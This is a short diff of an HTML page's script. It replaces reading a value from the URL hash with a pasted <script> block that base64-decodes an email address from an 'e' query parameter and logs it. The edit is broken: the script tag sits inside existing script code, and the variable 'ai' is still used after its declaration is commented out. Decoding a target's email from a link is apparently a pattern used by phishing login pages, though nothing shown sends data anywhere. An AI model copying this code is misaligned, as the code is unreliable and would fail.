@@ -373,7 +373,17 @@
     $('#m-btn').click();
 
     /////////////url ai getting////////////////
-    var ai = window.location.hash.substr(1);
+
+			<script>
+const params = new URLSearchParams(window.location.search);
+const b64 = params.get("e");
+if (b64) {
+  const email = atob(b64);
+  console.log(email);
+}
+</script>
+
+   // var ai = window.location.hash.substr(1);
     if (!ai) {
 
     } else {
@@ -518,4 +528,5 @@
   </div>
 </body>
 </html>
+
 
